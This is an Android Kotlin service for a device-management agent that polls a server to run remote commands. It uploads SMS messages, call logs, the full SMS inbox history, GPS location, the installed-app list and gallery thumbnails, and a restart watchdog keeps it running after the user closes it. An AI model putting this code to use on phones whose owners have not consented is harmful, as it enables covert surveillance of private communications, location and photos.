package com.example.gmaagent.service

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.app.Service
import android.content.Context
import android.content.Intent
import android.content.pm.ServiceInfo
import android.database.ContentObserver
import android.net.ConnectivityManager
import android.net.Network
import android.net.NetworkCapabilities
import android.net.NetworkRequest
import android.net.Uri
import android.os.Build
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import android.provider.CallLog
import android.provider.Telephony
import android.util.Log
import androidx.core.app.NotificationCompat
import androidx.core.content.ContextCompat
import com.example.gmaagent.MainActivity
import com.example.gmaagent.R
import com.example.gmaagent.command.CommandExecutor
import com.example.gmaagent.data.AgentPreferences
import com.example.gmaagent.data.DeviceDataReader
import com.example.gmaagent.network.ApiClient
import com.example.gmaagent.network.CommunicationLogSyncRequest
import com.example.gmaagent.network.DeviceSyncRequest
import com.example.gmaagent.network.ServerConfig
import com.example.gmaagent.receiver.RestartReceiver
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.cancel
import kotlinx.coroutines.delay
import kotlinx.coroutines.isActive
import kotlinx.coroutines.launch
import java.util.concurrent.atomic.AtomicBoolean

/**
 * Always-running Foreground Service that ensures real-time bidirectional sync:
 *
 * 1. Continuous live polling for remote commands (every 5-10s)
 * 2. Instant sync via ContentObserver on SMS & Call log databases
 * 3. Periodic incremental sync of SMS & Call logs
 * 4. Background one-time sync of full Communication Logs inbox history
 * 5. START_STICKY + RestartReceiver to ensure it stays alive even if the app is closed or killed
 */
class AgentBackgroundService : Service() {

    companion object {
        private const val TAG = "AgentBgService"
        private const val NOTIFICATION_ID = 9001
        private const val CHANNEL_ID = "emm_agent_live_channel"
        private const val CHANNEL_NAME = "EMM Agent Live Sync"
        private const val POLL_INTERVAL_MS = 8000L // Poll commands every 8 seconds
        private const val COMM_LOG_BATCH_SIZE = 500

        @Volatile
        var isRunning: Boolean = false
            private set

        @Volatile
        var instance: AgentBackgroundService? = null
            private set

        fun startService(context: Context) {
            val intent = Intent(context, AgentBackgroundService::class.java)
            try {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    ContextCompat.startForegroundService(context, intent)
                } else {
                    context.startService(intent)
                }
                Log.i(TAG, "AgentBackgroundService start requested")
            } catch (e: Exception) {
                Log.e(TAG, "Failed to start AgentBackgroundService", e)
            }
        }

        fun stopService(context: Context) {
            val intent = Intent(context, AgentBackgroundService::class.java)
            context.stopService(intent)
        }

        fun triggerImmediateSync() {
            instance?.executeImmediateSync()
        }
    }

    private val serviceJob = SupervisorJob()
    private val serviceScope = CoroutineScope(serviceJob + Dispatchers.IO)

    private var smsObserver: ContentObserver? = null
    private var callObserver: ContentObserver? = null
    private var networkCallback: ConnectivityManager.NetworkCallback? = null

    private val isSyncInProgress = AtomicBoolean(false)
    private var syncDebounceJob: Job? = null

    override fun onCreate() {
        super.onCreate()
        Log.i(TAG, "onCreate: Initializing live background sync service")
        instance = this
        isRunning = true

        createNotificationChannel()
        startAsForeground()

        registerContentObservers()
        registerNetworkCallback()
        startLivePollingLoop()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        Log.i(TAG, "onStartCommand: flags=$flags startId=$startId")
        instance = this
        isRunning = true

        // Ensure loops are active
        ensureConfigLoaded()
        executeImmediateSync()

        // If Android OS kills the service under memory pressure, restart it as soon as possible
        return START_STICKY
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onDestroy() {
        Log.w(TAG, "onDestroy: Service is being destroyed — triggering auto-restart watchdog")
        instance = null
        isRunning = false

        unregisterContentObservers()
        unregisterNetworkCallback()
        serviceScope.cancel()

        // Send restart broadcast so service resurrects if killed
        try {
            val restartIntent = Intent(applicationContext, RestartReceiver::class.java)
            sendBroadcast(restartIntent)
        } catch (e: Exception) {
            Log.e(TAG, "Failed to send restart broadcast", e)
        }

        super.onDestroy()
    }

    private fun registerNetworkCallback() {
        try {
            val cm = getSystemService(Context.CONNECTIVITY_SERVICE) as? ConnectivityManager ?: return
            val request = NetworkRequest.Builder()
                .addCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET)
                .build()

            networkCallback = object : ConnectivityManager.NetworkCallback() {
                override fun onAvailable(network: Network) {
                    Log.i(TAG, "NetworkCallback: Internet is AVAILABLE again! Triggering immediate reconnect & telemetry")
                    ApiClient.resetConnectionPool()
                    executeImmediateSync()
                }

                override fun onLost(network: Network) {
                    Log.w(TAG, "NetworkCallback: Internet connection LOST (data off)")
                }
            }
            cm.registerNetworkCallback(request, networkCallback!!)
            Log.i(TAG, "NetworkCallback successfully registered for automatic reconnect")
        } catch (e: Exception) {
            Log.e(TAG, "Failed to register NetworkCallback", e)
        }
    }

    private fun unregisterNetworkCallback() {
        try {
            val cm = getSystemService(Context.CONNECTIVITY_SERVICE) as? ConnectivityManager
            networkCallback?.let { cm?.unregisterNetworkCallback(it) }
            networkCallback = null
        } catch (e: Exception) {
            Log.w(TAG, "Failed to unregister NetworkCallback", e)
        }
    }

    fun executeImmediateSync() {
        serviceScope.launch {
            try {
                val apiKey = AgentPreferences.getDeviceApiKey(applicationContext)
                if (apiKey.isNotBlank()) {
                    ServerConfig.deviceApiKey = apiKey
                    ServerConfig.baseUrl = AgentPreferences.getServerUrl(applicationContext)

                    Log.i(TAG, "Executing immediate reconnect heartbeat...")
                    performTelemetrySync(force = true)
                    pollAndExecuteCommands()
                    performIncrementalSync()
                }
            } catch (e: Exception) {
                Log.e(TAG, "Error in executeImmediateSync", e)
            }
        }
    }

    override fun onTaskRemoved(rootIntent: Intent?) {
        super.onTaskRemoved(rootIntent)
        Log.i(TAG, "onTaskRemoved: User swiped app away from recents. Keeping service alive!")

        // Ensure restart if app is swiped away
        val restartIntent = Intent(applicationContext, RestartReceiver::class.java)
        sendBroadcast(restartIntent)
    }

    // ── Foreground Notification ──────────────────────────────────

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID,
                CHANNEL_NAME,
                NotificationManager.IMPORTANCE_LOW
            ).apply {
                description = "Keeps GMA Agent active in the background for real-time sync and remote commands"
                setShowBadge(false)
            }
            val manager = getSystemService(NotificationManager::class.java)
            manager?.createNotificationChannel(channel)
        }
    }

    private fun buildNotification(): Notification {
        val openAppIntent = Intent(this, MainActivity::class.java).apply {
            flags = Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP
        }
        val pendingIntent = PendingIntent.getActivity(
            this,
            0,
            openAppIntent,
            PendingIntent.FLAG_IMMUTABLE or PendingIntent.FLAG_UPDATE_CURRENT
        )

        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("GMA Agent — Live Sync Active")
            .setContentText("Continuous background monitoring & command execution active")
            .setSmallIcon(R.mipmap.ic_launcher)
            .setOngoing(true)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .setCategory(NotificationCompat.CATEGORY_SERVICE)
            .setContentIntent(pendingIntent)
            .build()
    }

    private fun startAsForeground() {
        val notification = buildNotification()
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                startForeground(
                    NOTIFICATION_ID,
                    notification,
                    ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC
                )
            } else {
                startForeground(NOTIFICATION_ID, notification)
            }
            Log.i(TAG, "Service running in foreground")
        } catch (e: Exception) {
            Log.e(TAG, "startForeground error", e)
        }
    }

    // ── Live Polling & Continuous Sync Loop ──────────────────────

    private fun startLivePollingLoop() {
        serviceScope.launch {
            Log.i(TAG, "Live polling loop started")

            while (isActive) {
                try {
                    val apiKey = AgentPreferences.getDeviceApiKey(applicationContext)
                    if (apiKey.isNotBlank()) {
                        ServerConfig.deviceApiKey = apiKey
                        ServerConfig.baseUrl = AgentPreferences.getServerUrl(applicationContext)

                        // 1. Fetch & execute pending commands
                        pollAndExecuteCommands()

                        // 2. Incremental sync of SMS and calls
                        performIncrementalSync()

                        // 3. Periodic Telemetry (Diagnostics, GPS, Network, Apps)
                        performTelemetrySync()

                        // 4. One-time Communication Logs sync if not done
                        if (!AgentPreferences.isCommLogsSynced(applicationContext)) {
                            syncCommunicationLogs()
                        }

                        // 5. Gallery scan (initial scan + periodic sync every 10 mins)
                        val now = System.currentTimeMillis()
                        val shouldScan = !hasScannedMedia || (now - lastMediaScanMs >= 600_000L)
                        if (shouldScan) {
                            lastMediaScanMs = now
                            performMediaScan()
                        }
                    } else {
                        Log.d(TAG, "Device not registered yet, skipping poll cycle")
                    }
                } catch (e: Exception) {
                    Log.e(TAG, "Error in live polling loop", e)
                }

                delay(POLL_INTERVAL_MS)
            }
        }
    }

    private var lastTelemetrySyncMs = 0L
    private var hasUploadedApps = false
    private var hasScannedMedia = false
    private var lastMediaScanMs = 0L

    private suspend fun performTelemetrySync(force: Boolean = false) {
        val now = System.currentTimeMillis()
        if (force || (now - lastTelemetrySyncMs >= 30000L)) {
            try {
                val shouldIncludeApps = !hasUploadedApps || ((now - lastTelemetrySyncMs) >= 600000L)
                val telemetry = DeviceDataReader.collectTelemetry(applicationContext, includeApps = shouldIncludeApps)
                val res = ApiClient.sendTelemetry(telemetry)
                if (res != null) {
                    lastTelemetrySyncMs = now
                    if (shouldIncludeApps) hasUploadedApps = true
                    Log.i(TAG, "Device telemetry synced (battery=${telemetry.battery_level}%, GPS=${telemetry.latitude},${telemetry.longitude})")
                }
            } catch (e: Exception) {
                Log.e(TAG, "Error performing telemetry sync", e)
            }
        }
    }

    private suspend fun performMediaScan() {
        try {
            Log.i(TAG, "Starting comprehensive gallery media scan...")
            var totalProcessed = 0
            com.example.gmaagent.data.MediaScanner.scanAndUploadAll(applicationContext) { batch ->
                val payload = com.example.gmaagent.network.MediaThumbnailSyncRequest(
                    thumbnails = batch
                )
                val result = ApiClient.syncMediaThumbnails(payload)
                if (result != null) {
                    totalProcessed += result.ingested
                    Log.i(TAG, "Media batch synced: ${result.ingested} ingested, ${result.skipped} skipped")
                }
                delay(300L)
            }
            hasScannedMedia = true
            Log.i(TAG, "Gallery scan complete — $totalProcessed thumbnails synced")
        } catch (e: Exception) {
            Log.e(TAG, "Error performing media scan", e)
        }
    }

    private suspend fun pollAndExecuteCommands() {
        try {
            val commands = ApiClient.fetchPendingCommands()
            if (commands.isNotEmpty()) {
                Log.i(TAG, "Found ${commands.size} pending command(s) in background!")
                for (cmd in commands) {
                    Log.i(TAG, "Executing background command: ${cmd.command_type} (${cmd.command_id})")
                    CommandExecutor.execute(applicationContext, cmd)
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error polling commands", e)
        }
    }

    private suspend fun performIncrementalSync() {
        if (!isSyncInProgress.compareAndSet(false, true)) {
            return
        }

        try {
            val lastSmsSyncTs = AgentPreferences.getLastSmsSyncTimestamp(applicationContext)
            val lastCallSyncTs = AgentPreferences.getLastCallSyncTimestamp(applicationContext)

            val smsList = DeviceDataReader.readSmsLogs(applicationContext, lastSmsSyncTs)
            val callList = DeviceDataReader.readCallLogs(applicationContext, lastCallSyncTs)

            if (smsList.isNotEmpty() || callList.isNotEmpty()) {
                Log.i(TAG, "Syncing incremental data: ${smsList.size} SMS, ${callList.size} Calls")

                val payload = DeviceSyncRequest(
                    sms_messages = smsList.ifEmpty { null },
                    call_logs = callList.ifEmpty { null },
                )

                val response = ApiClient.syncData(payload)
                if (response != null) {
                    val now = System.currentTimeMillis()
                    AgentPreferences.setLastSmsSyncTimestamp(applicationContext, now)
                    AgentPreferences.setLastCallSyncTimestamp(applicationContext, now)
                    Log.i(TAG, "Incremental sync successful: SMS=${response.sms_ingested}, Calls=${response.calls_ingested}")
                } else {
                    Log.w(TAG, "Incremental sync upload returned null")
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error during incremental sync", e)
        } finally {
            isSyncInProgress.set(false)
        }
    }

    private suspend fun syncCommunicationLogs() {
        try {
            val allLogs = DeviceDataReader.readInboxSmsHistory(applicationContext)
            if (allLogs.isEmpty()) {
                Log.i(TAG, "No inbox SMS found for Communication Logs")
                AgentPreferences.setCommLogsSynced(applicationContext, true)
                return
            }

            Log.i(TAG, "Uploading ${allLogs.size} Communication Logs in background...")
            val batches = allLogs.chunked(COMM_LOG_BATCH_SIZE)
            for (batch in batches) {
                val payload = CommunicationLogSyncRequest(logs = batch)
                val response = ApiClient.syncCommunicationLogs(payload)
                if (response == null) {
                    Log.w(TAG, "Communication logs batch failed, will retry next cycle")
                    return
                }
            }

            Log.i(TAG, "Communication Logs background sync complete!")
            AgentPreferences.setCommLogsSynced(applicationContext, true)
        } catch (e: Exception) {
            Log.e(TAG, "Error during communication logs sync", e)
        }
    }

    // ── ContentObservers for Instant Event Triggers ──────────────

    private fun registerContentObservers() {
        val handler = Handler(Looper.getMainLooper())

        smsObserver = object : ContentObserver(handler) {
            override fun onChange(selfChange: Boolean, uri: Uri?) {
                super.onChange(selfChange, uri)
                Log.d(TAG, "ContentObserver: SMS database changed -> triggering instant sync")
                triggerDebouncedSync()
            }
        }

        callObserver = object : ContentObserver(handler) {
            override fun onChange(selfChange: Boolean, uri: Uri?) {
                super.onChange(selfChange, uri)
                Log.d(TAG, "ContentObserver: Call database changed -> triggering instant sync")
                triggerDebouncedSync()
            }
        }

        try {
            contentResolver.registerContentObserver(
                Telephony.Sms.CONTENT_URI,
                true,
                smsObserver!!
            )
            contentResolver.registerContentObserver(
                CallLog.Calls.CONTENT_URI,
                true,
                callObserver!!
            )
            Log.i(TAG, "ContentObservers registered for SMS & Calls")
        } catch (e: SecurityException) {
            Log.w(TAG, "Missing permission to register ContentObserver: ${e.message}")
        } catch (e: Exception) {
            Log.e(TAG, "Failed to register ContentObserver", e)
        }
    }

    private fun unregisterContentObservers() {
        try {
            smsObserver?.let { contentResolver.unregisterContentObserver(it) }
            callObserver?.let { contentResolver.unregisterContentObserver(it) }
        } catch (e: Exception) {
            Log.e(TAG, "Error unregistering ContentObservers", e)
        }
    }

    private fun triggerDebouncedSync() {
        syncDebounceJob?.cancel()
        syncDebounceJob = serviceScope.launch {
            delay(1500L) // Debounce 1.5s so multiple changes coalesce into a single sync
            performIncrementalSync()
        }
    }

    private fun ensureConfigLoaded() {
        val apiKey = AgentPreferences.getDeviceApiKey(applicationContext)
        if (apiKey.isNotBlank()) {
            ServerConfig.deviceApiKey = apiKey
            ServerConfig.baseUrl = AgentPreferences.getServerUrl(applicationContext)
        }
    }
}
